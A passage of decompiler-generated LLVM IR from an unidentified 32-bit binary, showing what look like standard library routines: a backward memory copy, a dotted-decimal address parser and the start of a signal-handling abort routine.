  %v3_407bd4 = load i32, i32* %v2_407bd4, align 4
  store i32 %v3_407bd4, i32* %t1.global-to-local, align 4
  %v1_407bd8 = add i32 %v0_407bd8, -1
  store i32 %v1_407bd8, i32* %t3.global-to-local, align 4
  %v1_407bdc = add i32 %v3_407b5c, -16
  store i32 %v1_407bdc, i32* %a3.global-to-local, align 4
  %v2_407be0 = shl i32 %v3_407bd0, %v2_407b4c
  store i32 %v2_407be0, i32* %v1.global-to-local, align 4
  %v2_407be4 = lshr i32 %v3_407bd4, %v1_407b38
  %v2_407be8 = or i32 %v2_407be4, %v2_407be0
  store i32 %v2_407be8, i32* %v0.global-to-local, align 4
  %v1_407bec = add i32 %v0_407bcc, -8
  %v2_407bec = inttoptr i32 %v1_407bec to i32*
  %v3_407bec = load i32, i32* %v2_407bec, align 4
  store i32 %v3_407bec, i32* %t0.global-to-local, align 4
  %v2_407bf0 = add i32 %v3_407b5c, -4
  %v3_407bf0 = inttoptr i32 %v2_407bf0 to i32*
  store i32 %v2_407be8, i32* %v3_407bf0, align 4
  %v0_407bf4 = load i32, i32* %t1.global-to-local, align 4
  %v1_407bf4 = load i32, i32* %t5.global-to-local, align 4
  %v2_407bf4 = shl i32 %v0_407bf4, %v1_407bf4
  store i32 %v2_407bf4, i32* %v1.global-to-local, align 4
  %v0_407bf8 = load i32, i32* %t0.global-to-local, align 4
  %v1_407bf8 = load i32, i32* %t4.global-to-local, align 4
  %v2_407bf8 = lshr i32 %v0_407bf8, %v1_407bf8
  %v2_407bfc = or i32 %v2_407bf8, %v2_407bf4
  store i32 %v2_407bfc, i32* %v0.global-to-local, align 4
  %v0_407c00 = load i32, i32* %a0.global-to-local, align 4
  %v1_407c00 = add i32 %v0_407c00, 8
  %v2_407c00 = inttoptr i32 %v1_407c00 to i32*
  %v3_407c00 = load i32, i32* %v2_407c00, align 4
  store i32 %v3_407c00, i32* %t1.global-to-local, align 4
  %v1_407c04 = load i32, i32* %a3.global-to-local, align 4
  %v2_407c04 = add i32 %v1_407c04, 8
  %v3_407c04 = inttoptr i32 %v2_407c04 to i32*
  store i32 %v2_407bfc, i32* %v3_407c04, align 4
  %v0_407c08 = load i32, i32* %t0.global-to-local, align 4
  %v1_407c08 = load i32, i32* %t5.global-to-local, align 4
  %v2_407c08 = shl i32 %v0_407c08, %v1_407c08
  store i32 %v2_407c08, i32* %v1.global-to-local, align 4
  %v0_407c0c = load i32, i32* %t1.global-to-local, align 4
  %v1_407c0c = load i32, i32* %t4.global-to-local, align 4
  %v2_407c0c = lshr i32 %v0_407c0c, %v1_407c0c
  %v2_407c10 = or i32 %v2_407c0c, %v2_407c08
  store i32 %v2_407c10, i32* %v0.global-to-local, align 4
  %v0_407c14 = load i32, i32* %a0.global-to-local, align 4
  %v1_407c14 = add i32 %v0_407c14, 4
  %v2_407c14 = inttoptr i32 %v1_407c14 to i32*
  %v3_407c14 = load i32, i32* %v2_407c14, align 4
  store i32 %v3_407c14, i32* %t0.global-to-local, align 4
  %v1_407c18 = load i32, i32* %a3.global-to-local, align 4
  %v2_407c18 = add i32 %v1_407c18, 4
  %v3_407c18 = inttoptr i32 %v2_407c18 to i32*
  store i32 %v2_407c10, i32* %v3_407c18, align 4
  %v0_407c1c = load i32, i32* %t1.global-to-local, align 4
  %v1_407c1c = load i32, i32* %t5.global-to-local, align 4
  %v2_407c1c = shl i32 %v0_407c1c, %v1_407c1c
  store i32 %v2_407c1c, i32* %v1.global-to-local, align 4
  %v0_407c20 = load i32, i32* %t0.global-to-local, align 4
  %v1_407c20 = load i32, i32* %t4.global-to-local, align 4
  %v2_407c20 = lshr i32 %v0_407c20, %v1_407c20
  %v2_407c24 = or i32 %v2_407c20, %v2_407c1c
  store i32 %v2_407c24, i32* %v0.global-to-local, align 4
  %v0_407c28 = load i32, i32* %t3.global-to-local, align 4
  %v1_407c28 = add i32 %v0_407c28, -4
  store i32 %v1_407c28, i32* %t3.global-to-local, align 4
  %v0_407c2c = load i32, i32* %a0.global-to-local, align 4
  %v1_407c2c = inttoptr i32 %v0_407c2c to i32*
  %v2_407c2c = load i32, i32* %v1_407c2c, align 4
  store i32 %v2_407c2c, i32* %t1.global-to-local, align 4
  %v1_407c30 = load i32, i32* %a3.global-to-local, align 4
  %v2_407c30 = inttoptr i32 %v1_407c30 to i32*
  store i32 %v2_407c24, i32* %v2_407c30, align 4
  %v0_407c34 = load i32, i32* %t3.global-to-local, align 4
  %v1_407c34 = icmp eq i32 %v0_407c34, 0
  %v2_407c34 = load i32, i32* %a3.global-to-local, align 4
  %v3_407c34 = add i32 %v2_407c34, -16
  store i32 %v3_407c34, i32* @a3, align 4
  br i1 %v1_407c34, label %dec_label_pc_407c44, label %dec_label_pc_407c38

dec_label_pc_407c38:                              ; preds = %dec_label_pc_407bcc
  %v0_407c40 = load i32, i32* %a0.global-to-local, align 4
  %v1_407c40 = add i32 %v0_407c40, -16
  store i32 %v1_407c40, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407c44

dec_label_pc_407c44:                              ; preds = %dec_label_pc_407bcc, %dec_label_pc_407c38
  %v0_407c44 = load i32, i32* %t1.global-to-local, align 4
  %v1_407c44 = load i32, i32* %t4.global-to-local, align 4
  %v2_407c44 = lshr i32 %v0_407c44, %v1_407c44
  %v0_407c48 = load i32, i32* %t0.global-to-local, align 4
  %v1_407c48 = load i32, i32* %t5.global-to-local, align 4
  %v2_407c48 = shl i32 %v0_407c48, %v1_407c48
  %v2_407c4c = or i32 %v2_407c48, %v2_407c44
  %v2_407c50 = add i32 %v2_407c34, -4
  %v3_407c50 = inttoptr i32 %v2_407c50 to i32*
  store i32 %v2_407c4c, i32* %v3_407c50, align 4
  %v0_407c58 = load i32, i32* %a2.global-to-local, align 4
  %v2_407c58 = and i32 %v0_407c58, -4
  store i32 %v2_407c58, i32* %v0.global-to-local, align 4
  %v0_407c5c = load i32, i32* %t2.global-to-local, align 4
  %v2_407c5c = sub i32 %v0_407c5c, %v2_407c58
  store i32 %v2_407c5c, i32* %t2.global-to-local, align 4
  %v0_407c60 = load i32, i32* %a1.global-to-local, align 4
  %v2_407c60 = sub i32 %v0_407c60, %v2_407c58
  store i32 %v2_407c60, i32* %a1.global-to-local, align 4
  %v1_407c64 = urem i32 %v0_407c58, 4
  store i32 %v1_407c64, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_407c68

dec_label_pc_407c68:                              ; preds = %dec_label_pc_4079bc.dec_label_pc_407c68_crit_edge, %dec_label_pc_407c44
  %v0_407c7417 = phi i32 [ %v4_4079c4, %dec_label_pc_4079bc.dec_label_pc_407c68_crit_edge ], [ %v2_407c5c, %dec_label_pc_407c44 ]
  %v0_407c7014 = phi i32 [ %v2_4079c0, %dec_label_pc_4079bc.dec_label_pc_407c68_crit_edge ], [ %v2_407c60, %dec_label_pc_407c44 ]
  %v0_407c6c = phi i32 [ %v0_407c6c.pre, %dec_label_pc_4079bc.dec_label_pc_407c68_crit_edge ], [ %v1_407c64, %dec_label_pc_407c44 ]
  store i32 %v0_407c6c, i32* %a2.global-to-local, align 4
  %v1_407c7019 = inttoptr i32 %v0_407c7014 to i8*
  %v2_407c7020 = load i8, i8* %v1_407c7019, align 1
  %v3_407c7021 = zext i8 %v2_407c7020 to i32
  store i32 %v3_407c7021, i32* %v0.global-to-local, align 4
  %v1_407c7422 = add i32 %v0_407c7417, -1
  store i32 %v1_407c7422, i32* %t2.global-to-local, align 4
  %v3_407c7823 = inttoptr i32 %v1_407c7422 to i8*
  store i8 %v2_407c7020, i8* %v3_407c7823, align 1
  %v0_407c7c24 = load i32, i32* %a2.global-to-local, align 4
  %v1_407c7c25 = add i32 %v0_407c7c24, -1
  store i32 %v1_407c7c25, i32* %a2.global-to-local, align 4
  %v1_407c8026 = icmp eq i32 %v1_407c7c25, 0
  %v2_407c8027 = load i32, i32* %a1.global-to-local, align 4
  %v3_407c8028 = add i32 %v2_407c8027, -1
  store i32 %v3_407c8028, i32* %a1.global-to-local, align 4
  br i1 %v1_407c8026, label %dec_label_pc_407c84, label %dec_label_pc_407c70.dec_label_pc_407c70_crit_edge

dec_label_pc_407c70.dec_label_pc_407c70_crit_edge: ; preds = %dec_label_pc_407c68, %dec_label_pc_407c70.dec_label_pc_407c70_crit_edge
  %v3_407c8029 = phi i32 [ %v3_407c80, %dec_label_pc_407c70.dec_label_pc_407c70_crit_edge ], [ %v3_407c8028, %dec_label_pc_407c68 ]
  %v0_407c74.pre = load i32, i32* %t2.global-to-local, align 4
  %v1_407c70 = inttoptr i32 %v3_407c8029 to i8*
  %v2_407c70 = load i8, i8* %v1_407c70, align 1
  %v3_407c70 = zext i8 %v2_407c70 to i32
  store i32 %v3_407c70, i32* %v0.global-to-local, align 4
  %v1_407c74 = add i32 %v0_407c74.pre, -1
  store i32 %v1_407c74, i32* %t2.global-to-local, align 4
  %v3_407c78 = inttoptr i32 %v1_407c74 to i8*
  store i8 %v2_407c70, i8* %v3_407c78, align 1
  %v0_407c7c = load i32, i32* %a2.global-to-local, align 4
  %v1_407c7c = add i32 %v0_407c7c, -1
  store i32 %v1_407c7c, i32* %a2.global-to-local, align 4
  %v1_407c80 = icmp eq i32 %v1_407c7c, 0
  %v2_407c80 = load i32, i32* %a1.global-to-local, align 4
  %v3_407c80 = add i32 %v2_407c80, -1
  store i32 %v3_407c80, i32* %a1.global-to-local, align 4
  br i1 %v1_407c80, label %dec_label_pc_407c84, label %dec_label_pc_407c70.dec_label_pc_407c70_crit_edge

dec_label_pc_407c84:                              ; preds = %dec_label_pc_407c70.dec_label_pc_407c70_crit_edge, %dec_label_pc_407c68
  %v2_407c80.lcssa = phi i32 [ %v2_407c8027, %dec_label_pc_407c68 ], [ %v2_407c80, %dec_label_pc_407c70.dec_label_pc_407c70_crit_edge ]
  store i32 %v2_407c80.lcssa, i32* %a1.global-to-local, align 4
  %v0_407c8c = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_407c8c, i32* %v0.global-to-local, align 4
  ret i32 %v0_407c8c

; uselistorder directives
  uselistorder i32 %v3_407c80, { 1, 0 }
  uselistorder i32 %v1_407c64, { 1, 0 }
  uselistorder i32 %v0_407bcc, { 0, 3, 2, 1 }
  uselistorder i32 %v0_407bb8, { 2, 1, 0 }
  uselistorder i32 %v0_407ba0, { 2, 1, 0 }
  uselistorder i32 %v0_407b88, { 2, 1, 0 }
  uselistorder i32 %v1_407b48, { 2, 1, 0 }
  uselistorder i32 %v2_407b40, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_407b38, { 2, 1, 0 }
  uselistorder i32 %v0_407b94, { 4, 3, 2, 5, 1, 6, 0 }
  uselistorder i32 %v3_4079f8, { 3, 2, 0, 1 }
  uselistorder i32 %v1_4079f4, { 2, 1, 0 }
  uselistorder i32 %v0_4079f4.lcssa, { 2, 1, 0 }
  uselistorder i32 %v1_4079cc, { 2, 1, 0 }
  uselistorder i32 %v4_4079c4, { 2, 1, 0, 3 }
  uselistorder i32 %v2_4079c0, { 1, 0, 2 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 29, 30, 25, 26, 27, 28 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 9, 8, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 32, 27, 28, 29, 30 }
  uselistorder i32* %t2.global-to-local, { 0, 4, 5, 1, 6, 7, 8, 2, 9, 10, 3 }
  uselistorder i32* %gp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a3.global-to-local, { 3, 0, 2, 1, 4, 7, 5, 6, 8, 10, 9, 11 }
  uselistorder i32* %a2.global-to-local, { 1, 7, 8, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %a1.global-to-local, { 1, 3, 8, 9, 6, 2, 11, 13, 12, 4, 5, 10, 14, 7, 0 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i32 20, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 2, 15, 1, 16, 17, 18 }
  uselistorder i32 -8, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 16, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 1, 5, 29, 0, 30, 31, 32, 33, 2, 34, 36, 35, 37, 6, 38, 7, 39, 8, 40, 9, 41, 42, 43, 44, 3, 45, 4, 10, 46, 47 }
  uselistorder i32 ()* @unknown_0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 5, 0, 1, 4, 3, 2, 6 }
  uselistorder label %dec_label_pc_407c70.dec_label_pc_407c70_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407c68, { 1, 0 }
  uselistorder label %dec_label_pc_407c44, { 1, 0 }
  uselistorder label %dec_label_pc_407bcc, { 1, 0 }
  uselistorder label %dec_label_pc_407bb8, { 1, 0 }
  uselistorder label %dec_label_pc_407ba0, { 1, 0 }
  uselistorder label %dec_label_pc_407b88, { 1, 0 }
  uselistorder label %dec_label_pc_407b38, { 1, 0 }
  uselistorder label %dec_label_pc_407b30, { 1, 0 }
  uselistorder label %dec_label_pc_4079dc.dec_label_pc_4079dc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_4079bc, { 1, 0 }
}

define i32 @function_407ca0(i8* %arg1) local_unnamed_addr {
dec_label_pc_407ca0:
  %v1_407cac = icmp eq i8* %arg1, null
  %v2_407cac = load i32, i32* @a1, align 4
  br i1 %v1_407cac, label %dec_label_pc_407db0, label %dec_label_pc_407cb0

dec_label_pc_407cb0:                              ; preds = %dec_label_pc_407ca0
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_407cb4 = load i32, i32* bitcast (i32*** @global_var_4494b8.412 to i32*), align 4
  br label %dec_label_pc_407cc8

dec_label_pc_407cc8:                              ; preds = %dec_label_pc_407d5c, %dec_label_pc_407cb0
  %v0_407d5c = phi i32 [ %v2_407d60, %dec_label_pc_407d5c ], [ 0, %dec_label_pc_407cb0 ]
  %v0_407d64 = phi i32 [ %v1_407d64, %dec_label_pc_407d5c ], [ 1, %dec_label_pc_407cb0 ]
  %v0_407cc8 = phi i32 [ %v3_407d4816, %dec_label_pc_407d5c ], [ %tmp, %dec_label_pc_407cb0 ]
  %v1_407cc8 = inttoptr i32 %v0_407cc8 to i8*
  %v2_407cc8 = load i8, i8* %v1_407cc8, align 1
  %v3_407cc8 = sext i8 %v2_407cc8 to i32
  %v1_407cd0 = mul nsw i32 %v3_407cc8, 2
  %v2_407cd4 = add i32 %v1_407cd0, %v3_407cb4
  %v1_407cd8 = inttoptr i32 %v2_407cd4 to i16*
  %v2_407cd8 = load i16, i16* %v1_407cd8, align 2
  %v1_407ce0 = and i16 %v2_407cd8, 8
  %v1_407ce4 = icmp eq i16 %v1_407ce0, 0
  store i32 0, i32* @a3, align 4
  br i1 %v1_407ce4, label %dec_label_pc_407db0, label %dec_label_pc_407cf4.preheader

dec_label_pc_407cf4.preheader:                    ; preds = %dec_label_pc_407cc8
  %v0_407cf4.pre = load i32, i32* @a2, align 4
  %v3_407d28 = icmp slt i32 %v0_407d64, 4
  br label %dec_label_pc_407cf4

dec_label_pc_407cf4:                              ; preds = %dec_label_pc_407cf4.preheader, %dec_label_pc_407d00
  %v2_407cfc = phi i32 [ %v0_407cc8, %dec_label_pc_407cf4.preheader ], [ %v3_407cfc, %dec_label_pc_407d00 ]
  %v0_407cf4 = phi i32 [ %v0_407cf4.pre, %dec_label_pc_407cf4.preheader ], [ %v2_407d20, %dec_label_pc_407d00 ]
  %v1_407cf4 = add i32 %v0_407cf4, -48
  store i32 %v1_407cf4, i32* @a3, align 4
  %v1_407cf8 = icmp slt i32 %v1_407cf4, 256
  %v1_407cfc = icmp eq i1 %v1_407cf8, false
  %v3_407cfc = add i32 %v2_407cfc, 1
  br i1 %v1_407cfc, label %dec_label_pc_407db0, label %dec_label_pc_407d00

dec_label_pc_407d00:                              ; preds = %dec_label_pc_407cf4
  %v1_407d04 = inttoptr i32 %v3_407cfc to i8*
  %v2_407d04 = load i8, i8* %v1_407d04, align 1
  %v3_407d04 = sext i8 %v2_407d04 to i32
  %v2_407d10 = mul i32 %v1_407cf4, 10
  %v1_407d14 = mul nsw i32 %v3_407d04, 2
  %v2_407d18 = add i32 %v1_407d14, %v3_407cb4
  %v1_407d1c = inttoptr i32 %v2_407d18 to i16*
  %v2_407d1c = load i16, i16* %v1_407d1c, align 2
  %v3_407d1c = zext i16 %v2_407d1c to i32
  %v2_407d20 = add i32 %v3_407d04, %v2_407d10
  store i32 %v2_407d20, i32* @a2, align 4
  %v1_407d24 = and i32 %v3_407d1c, 8
  %v1_407d28 = icmp eq i32 %v1_407d24, 0
  br i1 %v1_407d28, label %dec_label_pc_407d2c, label %dec_label_pc_407cf4

dec_label_pc_407d2c:                              ; preds = %dec_label_pc_407d00
  %v1_407d30 = icmp eq i1 %v3_407d28, false
  br i1 %v1_407d30, label %dec_label_pc_407d48, label %dec_label_pc_407d34

dec_label_pc_407d34:                              ; preds = %dec_label_pc_407d2c
  %v2_407d38 = icmp eq i8 %v2_407d04, 46
  br i1 %v2_407d38, label %dec_label_pc_407d48.thread, label %dec_label_pc_407db0

dec_label_pc_407d48.thread:                       ; preds = %dec_label_pc_407d34
  %v3_407d4814 = add i32 %v2_407cfc, 3
  br label %dec_label_pc_407d4c

dec_label_pc_407d48:                              ; preds = %dec_label_pc_407d2c
  %v1_407d48 = icmp eq i8 %v2_407d04, 0
  %v3_407d48 = add i32 %v2_407cfc, 2
  br i1 %v1_407d48, label %dec_label_pc_407d5c, label %dec_label_pc_407d4c

dec_label_pc_407d4c:                              ; preds = %dec_label_pc_407d48.thread, %dec_label_pc_407d48
  %v3_407d4815 = phi i32 [ %v3_407d4814, %dec_label_pc_407d48.thread ], [ %v3_407d48, %dec_label_pc_407d48 ]
  %v1_407d50 = and i32 %v3_407d1c, 32
  %v1_407d54 = icmp eq i32 %v1_407d50, 0
  br i1 %v1_407d54, label %dec_label_pc_407db0, label %dec_label_pc_407d5c

dec_label_pc_407d5c:                              ; preds = %dec_label_pc_407d4c, %dec_label_pc_407d48
  %v3_407d4816 = phi i32 [ %v3_407d4815, %dec_label_pc_407d4c ], [ %v3_407d48, %dec_label_pc_407d48 ]
  %v1_407d5c = mul i32 %v0_407d5c, 256
  %v2_407d60 = or i32 %v1_407cf4, %v1_407d5c
  %v1_407d64 = add nuw nsw i32 %v0_407d64, 1
  %v1_407d68 = icmp slt i32 %v1_407d64, 5
  br i1 %v1_407d68, label %dec_label_pc_407cc8, label %dec_label_pc_407d70

dec_label_pc_407d70:                              ; preds = %dec_label_pc_407d5c
  %v1_407d74 = icmp eq i32 %v2_407cac, 0
  br i1 %v1_407d74, label %dec_label_pc_407d78, label %dec_label_pc_407d84

dec_label_pc_407d78:                              ; preds = %dec_label_pc_407d70
  ret i32 1

dec_label_pc_407d84:                              ; preds = %dec_label_pc_407d70
  %v3_407d74 = and i32 %v2_407d60, 65280
  %v1_407d84 = udiv i32 %v2_407d60, 256
  %v1_407d88 = and i32 %v1_407d84, 65280
  %v1_407d8c = mul nuw nsw i32 %v3_407d74, 256
  %v1_407d90 = udiv i32 %v2_407d60, 16777216
  %v1_407d94 = mul i32 %v1_407cf4, 16777216
  %v2_407d98 = or i32 %v1_407d90, %v1_407d94
  %v2_407d9c = or i32 %v2_407d98, %v1_407d8c
  %v2_407da0 = or i32 %v2_407d9c, %v1_407d88
  %v3_407da8 = inttoptr i32 %v2_407cac to i32*
  store i32 %v2_407da0, i32* %v3_407da8, align 4
  ret i32 1

dec_label_pc_407db0:                              ; preds = %dec_label_pc_407d34, %dec_label_pc_407d4c, %dec_label_pc_407cc8, %dec_label_pc_407cf4, %dec_label_pc_407ca0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_407d64, { 1, 0 }
  uselistorder i32 %v3_407d48, { 1, 0 }
  uselistorder i32 %v2_407d20, { 1, 0 }
  uselistorder i32 %v3_407d04, { 1, 0 }
  uselistorder i32 %v3_407cfc, { 1, 0 }
  uselistorder i32 %v0_407d64, { 1, 0 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 4, 6, 5, 14, 8, 7, 9, 10, 11, 13, 12 }
  uselistorder i32 65280, { 4, 5, 6, 1, 2, 0, 3 }
  uselistorder i32 5, { 5, 6, 2, 7, 8, 0, 9, 10, 11, 12, 13, 14, 1, 15, 3, 16, 17, 4, 18 }
  uselistorder i8 0, { 0, 1, 21, 2, 3, 4, 5, 6, 7, 22, 23, 24, 8, 9, 10, 11, 25, 26, 27, 12, 13, 28, 14, 15, 16, 29, 30, 17, 31, 18, 19, 20 }
  uselistorder i32 8, { 11, 12, 13, 0, 14, 15, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 7, 27, 2, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 3, 40, 41, 5, 4, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 8, 56, 9, 57, 10, 6, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72 }
  uselistorder i32 10, { 5, 15, 16, 0, 17, 6, 3, 18, 19, 7, 20, 21, 22, 1, 8, 23, 9, 10, 24, 25, 11, 26, 12, 27, 4, 28, 13, 29, 30, 31, 32, 2, 33, 34, 14 }
  uselistorder i32 256, { 0, 1, 2, 55, 3, 4, 56, 5, 7, 6, 8, 9, 10, 11, 12, 13, 57, 16, 14, 15, 17, 18, 19, 58, 20, 21, 22, 24, 23, 26, 25, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 39, 38, 41, 40, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32* @a3, { 12, 13, 14, 1, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 2, 27, 28, 29, 30, 31, 32, 33, 34, 35, 9, 10, 8, 36, 37, 3, 38, 39, 40, 41, 42, 43, 7, 44, 45, 46, 47, 11, 48, 49, 50, 51, 52, 53, 54, 55, 56, 5, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 6, 4 }
  uselistorder i16 0, { 0, 4, 5, 6, 2, 1, 3 }
  uselistorder i32* @a1, { 13, 14, 12, 3, 15, 16, 11, 9, 17, 18, 2, 19, 20, 4, 1, 0, 10, 21, 22, 23, 24, 5, 25, 6, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 7, 8 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_407db0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_407d4c, { 1, 0 }
  uselistorder label %dec_label_pc_407cf4, { 1, 0 }
}

define i32 @function_407dc0() local_unnamed_addr {
dec_label_pc_407dc0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %v1_407dc8 = load i32, i32* @t9, align 4
  %v2_407dc8 = add i32 %v1_407dc8, 300048
  store i32 %v2_407dc8, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4491b0.413 to i32), i32* %a0.global-to-local, align 4
  %v4_407de8 = call i32 @function_406884(i32 ptrtoint (i32* @global_var_4491b0.413 to i32))
  store i32 %v2_407dc8, i32* %gp.global-to-local, align 4
  %v2_407df4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_407df4, i32* @s0, align 4
  store i32 32, i32* %v1.global-to-local, align 4
  %v2_407e0024 = add i32 %v4_407de8, %v2_407df4
  %v1_407e0425 = inttoptr i32 %v2_407e0024 to i32*
  store i32 0, i32* %v1_407e0425, align 4
  %v0_407e0826 = load i32, i32* %v1.global-to-local, align 4
  %v1_407e0827 = add i32 %v0_407e0826, -1
  store i32 %v1_407e0827, i32* %v1.global-to-local, align 4
  %v1_407e0c28 = icmp sgt i32 %v1_407e0827, -1
  %v3_407e0c29 = mul i32 %v1_407e0827, 4
  store i32 %v3_407e0c29, i32* %v0.global-to-local, align 4
  br i1 %v1_407e0c28, label %dec_label_pc_407e00.dec_label_pc_407e00_crit_edge, label %dec_label_pc_407e10

dec_label_pc_407e00.dec_label_pc_407e00_crit_edge: ; preds = %dec_label_pc_407dc0, %dec_label_pc_407e00.dec_label_pc_407e00_crit_edge
  %v3_407e0c30 = phi i32 [ %v3_407e0c, %dec_label_pc_407e00.dec_label_pc_407e00_crit_edge ], [ %v3_407e0c29, %dec_label_pc_407dc0 ]
  %v1_407e00.pre = load i32, i32* @s0, align 4
  %v2_407e00 = add i32 %v3_407e0c30, %v1_407e00.pre
  %v1_407e04 = inttoptr i32 %v2_407e00 to i32*
  store i32 0, i32* %v1_407e04, align 4
  %v0_407e08 = load i32, i32* %v1.global-to-local, align 4
  %v1_407e08 = add i32 %v0_407e08, -1
  store i32 %v1_407e08, i32* %v1.global-to-local, align 4
  %v1_407e0c = icmp sgt i32 %v1_407e08, -1
  %v3_407e0c = mul i32 %v1_407e08, 4
  store i32 %v3_407e0c, i32* %v0.global-to-local, align 4
  br i1 %v1_407e0c, label %dec_label_pc_407e00.dec_label_pc_407e00_crit_edge, label %dec_label_pc_407e10

dec_label_pc_407e10:                              ; preds = %dec_label_pc_407e00.dec_label_pc_407e00_crit_edge, %dec_label_pc_407dc0
  store i32 %v2_407df4, i32* %a0.global-to-local, align 4
  store i32 6, i32* %a1.global-to-local, align 4
  %v3_407e1c = call i32 @function_405d68(i32 %v2_407df4, i32 6)
  store i32 %v3_407e1c, i32* %v0.global-to-local, align 4
  store i32 %v2_407dc8, i32* %gp.global-to-local, align 4
  %v1_407e28 = icmp eq i32 %v3_407e1c, 0
  store i32 %v2_407df4, i32* %a1.global-to-local, align 4
  br i1 %v1_407e28, label %dec_label_pc_407e2c, label %dec_label_pc_407e48

dec_label_pc_407e2c:                              ; preds = %dec_label_pc_407e10
  %v3_407e30 = load i32, i32* @global_var_4493d0.354, align 4
  store i32 %v3_407e30, i32* @t9, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  %v4_407e38 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v5_407e38 = call i32 @function_4074f0(i32 2, %_TYPEDEF_sigset_t* %v4_407e38, i32 0)
  store i32 %v5_407e38, i32* %v0.global-to-local, align 4
  store i32 %v2_407dc8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_407e48

dec_label_pc_407e48:                              ; preds = %dec_label_pc_407e10, %dec_label_pc_407e2c
  %v3_407e48 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_407e48, i32* %v1.global-to-local, align 4
  %v3_407e50 = load i32, i32* @global_var_4495a0.414, align 4
  %v1_407e58 = icmp eq i32 %v3_407e50, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_407e58, label %dec_label_pc_407e5c, label %dec_label_pc_407eb0

dec_label_pc_407e5c:                              ; preds = %dec_label_pc_407e48
  store i32 1, i32* @global_var_4495a0.414, align 4
  store i32 %v3_407e48, i32* @s0, align 4
  store i32 ptrtoint (i32* @global_var_4491b0.413 to i32), i32* %a0.global-to-local, align 4
  %v4_407e70 = call i32 @function_406884(i32 ptrtoint (i32* @global_var_4491b0.413 to i32))
  store i32 %v4_407e70, i32* %v0.global-to-local, align 4
  store i32 %v2_407dc8, i32* %gp.global-to-local, align 4
  %v3_407e80 = load i32, i32* @global_var_4492a4.415, align 4
  store i32 %v3_407e80, i32* @t9, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  %v2_407e88 = call i32 @function_408010(i32 6)
  store i32 %v2_407e88, i32* %v0.global-to-local, align 4
  store i32 %v2_407dc8, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4491b0.413 to i32), i32* %a0.global-to-local, align 4
  %v4_407ea0 = call i32 @function_406884(i32 ptrtoint (i32* @global_var_4491b0.413 to i32))
  store i32 %v4_407ea0, i32* %v0.global-to-local, align 4
  store i32 %v2_407dc8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_407eb0

dec_label_pc_407eb0:                              ; preds = %dec_label_pc_407e48, %dec_label_pc_407e5c
  %v1_407eb0 = add i32 %v1_407dc8, 267304
  %v2_407eb0 = inttoptr i32 %v1_407eb0 to i32*
  %v3_407eb0 = load i32, i32* %v2_407eb0, align 4
  store i32 %v3_407eb0, i32* @a0, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v1_407eb8 = add i32 %v3_407eb0, -27232
  %v2_407eb8 = inttoptr i32 %v1_407eb8 to i32*
  %v3_407eb8 = load i32, i32* %v2_407eb8, align 4
  store i32 %v3_407eb8, i32* %v1.global-to-local, align 4
  %v2_407ec0 = icmp eq i32 %v3_407eb8, 1
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_407ec0, label %dec_label_pc_407ec4, label %dec_label_pc_407f30

dec_label_pc_407ec4:                              ; preds = %dec_label_pc_407eb0
  %v1_407ec8 = add i32 %v1_407dc8, 267332
  %v2_407ec8 = inttoptr i32 %v1_407ec8 to i32*
  %v3_407ec8 = load i32, i32* %v2_407ec8, align 4
